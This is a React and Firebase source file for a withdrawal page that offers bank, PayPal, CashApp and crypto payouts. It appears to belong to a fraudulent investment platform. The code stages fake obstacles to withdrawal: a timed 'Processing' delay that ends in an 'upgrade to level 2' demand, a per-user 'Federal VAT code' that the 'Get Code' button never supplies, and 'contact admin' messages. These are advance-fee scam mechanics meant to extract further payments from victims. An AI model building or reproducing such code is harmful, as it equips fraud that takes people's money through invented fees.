import React, { useState, useEffect } from 'react';
import { auth, db } from '../firebaseconfig';
import {
  doc,
  getDoc,
  addDoc,
  collection,
  updateDoc,
  serverTimestamp,
  onSnapshot
} from 'firebase/firestore';
import { Dialog } from '@headlessui/react';
import Sidenav from '../components/Sidenav';
import { useNavigate } from 'react-router-dom';

const Bank = () => {
  const navigate = useNavigate();

  // State Management
  const [userData, setUserData] = useState(null);
  const [isLoading, setIsLoading] = useState(true);

  // Payment Method States
  const [paymentMethod, setPaymentMethod] = useState('Bank');
  const [accountNumber, setAccountNumber] = useState('');
  const [accountHolderName, setAccountHolderName] = useState('');
  const [bankName, setBankName] = useState('');
  const [email, setEmail] = useState('');
  const [cryptoAddress, setCryptoAddress] = useState('');
  const [cryptoType, setCryptoType] = useState('BTC');

  // Transaction States
  const [amount, setAmount] = useState('');
  const [loading, setLoading] = useState(false);

  // Popup States
  const [showUpgradePopup, setShowUpgradePopup] = useState(false);
  const [showCodePopup, setShowCodePopup] = useState(false);
  const [showAdminPopup, setShowAdminPopup] = useState(false);
  const [code, setCode] = useState('');

  // Continuous User Data Fetching
  useEffect(() => {
    const fetchAndListenToUserData = () => {
      const user = auth.currentUser;

      if (!user) {
        setIsLoading(false);
        navigate('/login'); // Redirect if no user
        return;
      }

      // Real-time listener for user document
      const userDocRef = doc(db, 'users', user.uid);
      const unsubscribe = onSnapshot(
        userDocRef,
        (doc) => {
          if (doc.exists()) {
            const userData = doc.data();
            setUserData(userData);
            setIsLoading(false);
          } else {
            setUserData(null);
            setIsLoading(false);
            navigate('/login');
          }
        },
        (error) => {
          console.error("Error fetching user data:", error);
          setIsLoading(false);
          navigate('/login');
        }
      );

      // Cleanup subscription on component unmount
      return () => unsubscribe();
    };

    // Initial fetch and set up real-time listener
    fetchAndListenToUserData();

    // Add listener for auth state changes
    const unsubscribeAuth = auth.onAuthStateChanged((user) => {
      if (user) {
        fetchAndListenToUserData();
      } else {
        setUserData(null);
        setIsLoading(false);
        navigate('/profile');
      }
    });

    // Cleanup both listeners
    return () => {
      unsubscribeAuth();
    };
  }, [navigate]);
  const handleSetCode = () => {
    // Close the code popup
    setShowCodePopup(false);

    // Open the admin popup to inform about setting the VAT code
    setShowAdminPopup(true);
  };

  // Withdrawal Handler
  const handleWithdraw = () => {
    if (isLoading) return;

    if (!userData) {
      alert('User data not available');
      return;
    }

    // Account Level Check
    if (userData.accountLevel <= 1) {
      setLoading(true);
      setTimeout(() => {
        setLoading(false);
        setShowUpgradePopup(true);
      }, 2000);
      return;
    }

    // Amount Validation
    const withdrawAmount = parseFloat(amount);
    if (isNaN(withdrawAmount) || withdrawAmount <= 0) {
      alert('Please enter a valid amount');
      return;
    }

    if (withdrawAmount <= userData.accountBalance) {
      setShowCodePopup(true);
    } else {
      alert('Insufficient balance. Transfer pending, kindly contact admin.');
    }
  };

  // Code Submission Handler
  const handleCodeSubmit = async () => {
    const user = auth.currentUser;
    if (!user) return;

    try {
      // VAT Code Verification
      if (String(userData.vatCode) !== String(code)) {
        alert('Incorrect VAT code. Please try again.');
        return;
      }

      const userDocRef = doc(db, 'users', user.uid);
      const withdrawalAmount = parseFloat(amount);

      // Update Account Balance
      await updateDoc(userDocRef, {
        accountBalance: userData.accountBalance - withdrawalAmount
      });

      // Create Withdrawal Transaction
      await addDoc(collection(db, 'transactions'), {
        type: 'withdrawal',
        method: paymentMethod,
        accountNumber: accountNumber || '',
        accountHolderName: accountHolderName || '',
        bankName: bankName || '',
        email: email || '',
        cryptoType: cryptoType || '',
        amount: withdrawalAmount,
        date: serverTimestamp(),
        status: 'pending',
        userId: user.uid,
      });

      // Detailed Withdrawal Record
      await addDoc(collection(db, 'withdrawals'), {
        uid: user.uid,
        accountNumber,
        accountHolderName,
        bankName,
        email,
        cryptoAddress,
        cryptoType,
        amount: withdrawalAmount,
        timestamp: new Date(),
      });

      alert('Withdrawal request submitted successfully');
      setShowCodePopup(false);

      // Reset form
      setAmount('');
      setCode('');
    } catch (error) {
      console.error('Withdrawal Error:', error);
      alert('An error occurred. Please try again.');
    }
  };

  // Loading State Render
  if (isLoading) {
    return (
      <div className="flex justify-center items-center h-screen">
        <div className="animate-spin rounded-full h-32 w-32 border-t-2 border-b-2 border-[#cc6f3d]"></div>
      </div>
    );
  }

  // No User Data Render
  if (!userData) {
    return (
      <div className="flex justify-center items-center h-screen">
        <p>No user data found. Please log in again.</p>
      </div>
    );
  }

  // Main Component Render
  return (
    <div className="container mx-auto p-4 text-gray-900 font-sans">
      <Sidenav />
      <div className="flex mb-6">
        <h2 className="text-2xl font-bold ">Withdrawal</h2>
      </div>
      <div className="flex flex-col mx-auto w-full max-w-md">
        {/* Payment Method Selection */}
        <div className="mb-4">
          <label className="block mb-2 text-lg font-medium">Select Payment Method</label>
          <select
            value={paymentMethod}
            onChange={(e) => setPaymentMethod(e.target.value)}
            className="border border-gray-300 rounded w-full py-2 px-3"
          >
            <option value="Bank">Bank</option>
            <option value="PayPal">PayPal</option>
            <option value="CashApp">CashApp</option>
            <option value="Crypto">Cryptocurrency</option>
          </select>
        </div>

        {/* Conditional Inputs Based on Payment Method */}
        {paymentMethod === 'Bank' && (
          <>
            <div className="mb-4">
              <label className="block mb-2 text-lg font-medium">Account Number</label>
              <input
                type="number"
                placeholder="Account Number"
                value={accountNumber}
                onChange={(e) => setAccountNumber(e.target.value)}
                className="border border-gray-300 rounded w-full py-2 px-3"
              />
            </div>
            <div className="mb-4">
              <label className="block mb-2 text-lg font-medium">Bank Name</label>
              <input
                type="text"
                placeholder="Bank Name"
                value={bankName}
                onChange={(e) => setBankName(e.target.value)}
                className="border border-gray-300 rounded w-full py-2 px-3"
              />
            </div>
            <div className="mb-4">
              <label className="block mb-2 text-lg font-medium">Account Holder Name</label>
              <input
                type="text"
                placeholder="Account Holder Name"
                value={accountHolderName}
                onChange={(e) => setAccountHolderName(e.target.value)}
                className="border border-gray-300 rounded w-full py-2 px-3"
              />
            </div>
          </>
        )}

        {(paymentMethod === 'PayPal' || paymentMethod === 'CashApp') && (
          <>
            <div className="mb-4">
              <label className="block mb-2 text-lg font-medium">Email</label>
              <input
                type="email"
                placeholder="Email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                className="border border-gray-300 rounded w-full py-2 px-3"
              />
            </div>
            <div className="mb-4">
              <label className="block mb-2 text-lg font-medium">Account Holder Name</label>
              <input
                type="text"
                placeholder="Account Holder Name"
                value={accountHolderName}
                onChange={(e) => setAccountHolderName(e.target.value)}
                className="border border-gray-300 rounded w-full py-2 px-3"
              />
            </div>
          </>
        )}

        {paymentMethod === 'Crypto' && (
          <>
            <div className="mb-4">
              <label className="block mb-2 text-lg font-medium">Crypto Address</label>
              <input
                type="text"
                placeholder="Crypto Address"
                value={cryptoAddress}
                onChange={(e) => setCryptoAddress(e.target.value)}
                className="border border-gray-300 rounded w-full py-2 px-3"
              />
            </div>
            <div className="mb-4">
              <label className="block mb-2 text-lg font-medium">Select Cryptocurrency</label>
              <select
                value={cryptoType}
                onChange={(e) => setCryptoType(e.target.value)}
                className="border border-gray-300 rounded w-full py-2 px-3"
              >
                <option value="BTC">Bitcoin (BTC)</option>
                <option value="ETH">Ethereum (ETH)</option>
                <option value="USDT">Tether (USDT)</option>
              </select>
            </div>
          </>
        )}

        {/* Common Amount Input */}
        <div className="mb-4">
          <label className="block mb-2 text-lg font-medium">Amount</label>
          <input
            type="number"
            placeholder="Amount"
            value={amount}
            onChange={(e) => setAmount(e.target.value)}
            className="border border-gray-300 rounded w-full py-2 px-3"
          />
        </div>

        {/* Withdraw Button with Loading State */}
        <button
          onClick={handleWithdraw}
          className={`bg-[#cc6f3d] text-white py-2 px-4 rounded-lg w-full ${loading ? 'cursor-not-allowed' : ''}`}
          disabled={loading}
        >
          {loading ? 'Processing...' : 'Withdraw'}
        </button>
      </div>

      {/* Upgrade Popup */}
      <Dialog open={showUpgradePopup} onClose={() => setShowUpgradePopup(false)}>
        <div className="fixed inset-0 bg-black bg-opacity-30 flex items-center justify-center">
          <div className="bg-white p-6 rounded-lg">
            <Dialog.Title className="text-lg font-bold">Upgrade Required</Dialog.Title>
            <div className="mt-4">
              <p>Your account level is too low for this transaction. Please upgrade to level 2.</p>
              <button
                onClick={() => setShowUpgradePopup(false)}
                className="mt-4 bg-blue-500 text-white py-2 px-4 rounded-lg"
              >
                OK
              </button>
            </div>
          </div>
        </div>
      </Dialog>

      {/* Enter Code Popup */}
      <Dialog
        open={showCodePopup}
        onClose={() => setShowCodePopup(false)}
      >
        <div className="fixed inset-0 bg-black/40 flex items-center justify-center p-4">
          <div className="bg-white w-full max-w-md rounded-xl shadow-xl border border-gray-200 overflow-hidden">
            <div className="bg-gray-50 px-6 py-4 border-b">
              <Dialog.Title
                className="text-xl font-semibold text-gray-800"
              >
                Verify Withdrawal
              </Dialog.Title>
            </div>

            <div className="p-6">
              <input
                type="text"
                placeholder="Enter 4-Digit Code"
                value={code}
                maxLength={4}
                onChange={(e) => setCode(e.target.value)}
                className="w-full px-4 py-3 border-2 border-gray-300 rounded-lg 
          focus:outline-none focus:border-blue-500 
          text-center tracking-[10px] text-xl 
          transition-colors duration-300"
              />

              <div className="mt-6 flex space-x-4">
                <button
                  onClick={handleCodeSubmit}
                  className="flex-1 bg-orange-600 text-white py-3 rounded-lg 
            hover:bg-orange-700 transition-colors 
            focus:outline-none focus:ring-2 focus:ring-orange-500"
                >
                  Submit
                </button>

                <button
                  onClick={handleSetCode}
                  className="flex-1 bg-blue-600 text-white py-3 rounded-lg 
            hover:bg-blue-700 transition-colors 
            focus:outline-none focus:ring-2 focus:ring-blue-500"
                >
                  Get Code
                </button>
              </div>
            </div>
          </div>
        </div>
      </Dialog>

      {/* Contact Admin Popup */}
      <Dialog open={showAdminPopup} onClose={() => setShowAdminPopup(false)}>
        <div className="fixed inset-0 bg-black bg-opacity-30 flex items-center justify-center">
          <div className="bg-white p-6 rounded-lg">
            <Dialog.Title className="text-lg font-bold">Contact Admin</Dialog.Title>
            <div className="mt-4">
              <p>The Federal VAT code is required before this transaction can be completed successfully.</p>
              <button
                onClick={() => setShowAdminPopup(false)}
                className="mt-4 bg-blue-500 text-white py-2 px-4 rounded-lg"
              >
                OK
              </button>
            </div>
          </div>
        </div>
      </Dialog>
    </div>
  );
};

export default Bank;